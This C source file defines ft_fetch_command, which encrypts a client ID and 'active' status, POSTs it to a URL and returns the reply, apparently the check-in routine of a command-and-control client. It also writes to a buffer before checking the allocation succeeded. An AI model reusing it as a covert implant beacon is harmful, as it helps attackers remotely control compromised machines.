#include "ft_util.h"

char *ft_fetch_command(const char *url, const char *client_id, const unsigned char *key)
{
    char *inner_json;
    char *encrypted_payload;
    char *http_body;
    char *response;
    int len;

    len = snprintf(NULL, 0, "{\"client_id\":\"%s\",\"status\":\"active\"}", client_id);
    if (len < 0)
    {
        errprint("snprintf", "failed to calculate length");
        return (NULL);
    }
    inner_json = malloc(len + 1);
    snprintf(inner_json, len + 1, "{\"client_id\":\"%s\",\"status\":\"active\"}", client_id);
    if (!inner_json)
    {
        errprint("malloc", "failed to allocate memory for inner_json");
        return (NULL);
    }
    encrypted_payload = ft_encrypt_and_b64(inner_json, key);
    free(inner_json);
    if (!encrypted_payload)
    {
        errprint("ft_encrypt_and_b64", "failed to encrypt payload");
        return (NULL);
    }

    len = snprintf(NULL, 0, "{\"payload\":\"%s\"}", encrypted_payload);
    if (len < 0)
    {
        errprint("snprintf", "failed to calculate length for http_body");
        free(encrypted_payload);
        return (NULL);
    }
    http_body = malloc(len + 1);
    if (!http_body)
    {
        errprint("malloc", "failed to allocate memory for http_body");
        free(encrypted_payload);
        return (NULL);
    }
    snprintf(http_body, len + 1, "{\"payload\":\"%s\"}", encrypted_payload);
    free(encrypted_payload);

    response = ft_http_post(url, http_body);
    free(http_body);
    if (!response)
    {
        errprint("ft_http_post", "failed to post request");
        return (NULL);
    }
    return (response);
}

